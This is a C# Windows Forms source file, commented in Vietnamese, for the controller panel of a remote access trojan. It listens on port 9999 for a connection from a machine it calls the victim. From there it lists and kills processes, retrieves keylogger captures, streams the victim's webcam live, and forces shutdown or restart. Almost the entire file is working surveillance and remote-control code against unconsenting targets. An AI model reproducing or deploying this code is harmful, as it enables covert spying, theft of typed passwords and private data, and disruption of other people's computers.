using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

// --- NHỚ KIỂM TRA TÊN NAMESPACE CỦA BẠN ---
namespace Server_controller
{
    public partial class Form1 : Form
    {
        TcpListener listener;
        TcpClient victimClient;
        NetworkStream stream;
        System.Windows.Forms.Timer camTimer = new System.Windows.Forms.Timer();

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

            SetupUI_Final(); // Gọi giao diện đầy đủ

            Thread t = new Thread(StartListening);
            t.IsBackground = true;
            t.Start();
            Log("=== SERVER ĐANG CHỜ KẾT NỐI (PORT 9999) ===");
        }

        void StartListening()
        {
            try
            {
                listener = new TcpListener(IPAddress.Any, 9999);
                listener.Start();
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    victimClient = client;
                    stream = client.GetStream();
                    Log("\n>>> KẾT NỐI THÀNH CÔNG! <<<");
                    Thread t = new Thread(ReceiveData);
                    t.IsBackground = true;
                    t.Start();
                }
            }
            catch (Exception ex) { Log("Lỗi: " + ex.Message); }
        }

        void ReceiveData()
        {
            try
            {
                byte[] buffer = new byte[1024 * 10000];
                while (victimClient.Connected)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead > 0)
                    {
                        string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                        if (response.Contains("PID:")) // 1. Danh sách App
                        {
                            Log("=== DANH SÁCH APP ĐANG CHẠY ===");
                            Log(response);
                            Log("===============================");
                        }
                        else if (response.Length > 1000) // 2. Ảnh Webcam
                        {
                            try
                            {
                                byte[] img = Convert.FromBase64String(response);
                                using (MemoryStream ms = new MemoryStream(img)) pbScreen.Image = Image.FromStream(ms);
                            }
                            catch { }
                        }
                        else if (!response.Contains("NO_IMAGE")) // 3. Tin nhắn thường
                        {
                            Log("Client: " + response);
                        }
                    }
                }
            }
            catch { Log("Mất kết nối."); stopCam(); }
        }

        void SendCommand(string cmd)
        {
            if (victimClient == null || !victimClient.Connected) return;
            try { byte[] data = Encoding.UTF8.GetBytes(cmd); stream.Write(data, 0, data.Length); } catch { }
        }

        // =========================================================
        // SỰ KIỆN NÚT BẤM (ĐÃ THÊM SHUTDOWN/RESTART)
        // =========================================================
        private void btnStartApp_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(txtAppName.Text)) { SendCommand("START|" + txtAppName.Text); Log("Mở: " + txtAppName.Text); }
        }
        private void btnStopApp_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(txtAppName.Text)) { SendCommand("STOP|" + txtAppName.Text); Log("Tắt: " + txtAppName.Text); }
        }
        private void btnGetKeylog_Click(object sender, EventArgs e) { Log(">>> Đang tải Keylog..."); SendCommand("KEYLOG"); }
        private void btnGetList_Click(object sender, EventArgs e)
        {
            Log(">>> Đang quét danh sách tiến trình...");
            SendCommand("LIST");
        }

        // NÚT TẮT MÁY (SHUTDOWN)
        private void btnShutdown_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Xác nhận TẮT máy nạn nhân ngay lập tức?", "CẢNH BÁO", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                SendCommand("SHUTDOWN");
                Log("!!! ĐÃ GỬI LỆNH TẮT MÁY !!!");
            }
        }

        // NÚT RESTART MÁY
        private void btnRestart_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Xác nhận RESTART máy nạn nhân ngay lập tức?", "CẢNH BÁO", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                SendCommand("RESTART");
                Log("!!! ĐÃ GỬI LỆNH RESTART MÁY !!!");
            }
        }

        private void btnCamOn_Click(object sender, EventArgs e)
        {
            SendCommand("WEBCAM_ON");
            camTimer.Interval = 100; camTimer.Tick += (s, ev) => SendCommand("WEBCAM_GET"); camTimer.Start();
        }
        private void btnStopCam_Click(object sender, EventArgs e) { stopCam(); SendCommand("WEBCAM_OFF"); }
        void stopCam() { camTimer.Stop(); pbScreen.Image = null; }


        // =========================================================
        // GIAO DIỆN FINAL (ĐÃ THÊM NÚT TẮT/RESTART)
        // =========================================================
        RichTextBox txtLog; TextBox txtAppName; PictureBox pbScreen;

        void SetupUI_Final()
        {
            this.Size = new System.Drawing.Size(950, 600);
            this.Text = "MASTER CONTROLLER";
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;

            // 1. Cột Trái: Log
            txtLog = new RichTextBox();
            txtLog.Location = new Point(10, 10);
            txtLog.Size = new System.Drawing.Size(280, 310);
            txtLog.ReadOnly = true;
            txtLog.BackColor = Color.White;
            this.Controls.Add(txtLog);

            // 2. Nút Lấy Danh Sách App
            Button btnList = new Button();
            btnList.Text = "XEM DANH SÁCH APP CHẠY NGẦM";
            btnList.Location = new Point(10, 330);
            btnList.Size = new Size(280, 35);
            btnList.BackColor = Color.LightBlue;
            btnList.Click += btnGetList_Click;
            this.Controls.Add(btnList);

            // 3. Khu vực nhập tên App
            Label lbl = new Label(); lbl.Text = "Tên App/PID:";
            lbl.Location = new Point(10, 380); lbl.AutoSize = true;
            this.Controls.Add(lbl);

            txtAppName = new TextBox();
            txtAppName.Location = new Point(10, 400);
            txtAppName.Size = new Size(160, 25);
            txtAppName.Text = "notepad";
            this.Controls.Add(txtAppName);

            Button btnOpen = new Button(); btnOpen.Text = "MỞ";
            btnOpen.Location = new Point(180, 398); btnOpen.Size = new Size(50, 28);
            btnOpen.BackColor = Color.LightGreen;
            btnOpen.Click += btnStartApp_Click; this.Controls.Add(btnOpen);

            Button btnKill = new Button(); btnKill.Text = "TẮT";
            btnKill.Location = new Point(240, 398); btnKill.Size = new Size(50, 28);
            btnKill.BackColor = Color.LightPink;
            btnKill.Click += btnStopApp_Click; this.Controls.Add(btnKill);

            // 4. Nút Keylog
            Button btnKey = new Button(); btnKey.Text = "LẤY KEYLOG (PHÍM BẤM)";
            btnKey.Location = new Point(10, 440); btnKey.Size = new Size(280, 40);
            btnKey.BackColor = Color.Orange;
            btnKey.Click += btnGetKeylog_Click; this.Controls.Add(btnKey);

            // 5. Cột Phải: Camera
            pbScreen = new PictureBox();
            pbScreen.Location = new Point(310, 10);
            pbScreen.Size = new Size(600, 450);
            pbScreen.SizeMode = PictureBoxSizeMode.StretchImage;
            pbScreen.BackColor = Color.Black;
            pbScreen.BorderStyle = BorderStyle.Fixed3D;
            this.Controls.Add(pbScreen);

            // 6. Nút điều khiển CAM
            Button btnCam = new Button(); btnCam.Text = "BẬT CAM LIVE";
            btnCam.Location = new Point(310, 470); btnCam.Size = new Size(150, 40);
            btnCam.BackColor = Color.Red; btnCam.ForeColor = Color.White;
            btnCam.Click += btnCamOn_Click; this.Controls.Add(btnCam);

            Button btnStopCam = new Button(); btnStopCam.Text = "NGẮT CAM";
            btnStopCam.Location = new Point(470, 470); btnStopCam.Size = new Size(150, 40);
            btnStopCam.Click += btnStopCam_Click; this.Controls.Add(btnStopCam);

            // --- NÚT TẮT/RESTART MỚI THÊM ---
            Button btnShutdown = new Button(); btnShutdown.Text = "TẮT MÁY";
            btnShutdown.Location = new Point(640, 470); btnShutdown.Size = new Size(130, 40);
            btnShutdown.BackColor = Color.DarkRed; btnShutdown.ForeColor = Color.White;
            btnShutdown.Click += btnShutdown_Click;
            this.Controls.Add(btnShutdown);

            Button btnRestart = new Button(); btnRestart.Text = "RESTART";
            btnRestart.Location = new Point(780, 470); btnRestart.Size = new Size(130, 40);
            btnRestart.BackColor = Color.DarkOrange; btnRestart.ForeColor = Color.White;
            btnRestart.Click += btnRestart_Click;
            this.Controls.Add(btnRestart);
            // ------------------------------------
        }

        void Log(string msg) { if (txtLog.InvokeRequired) { txtLog.Invoke(new Action(() => Log(msg))); return; } txtLog.AppendText(msg + "\n"); txtLog.ScrollToCaret(); }
    }
}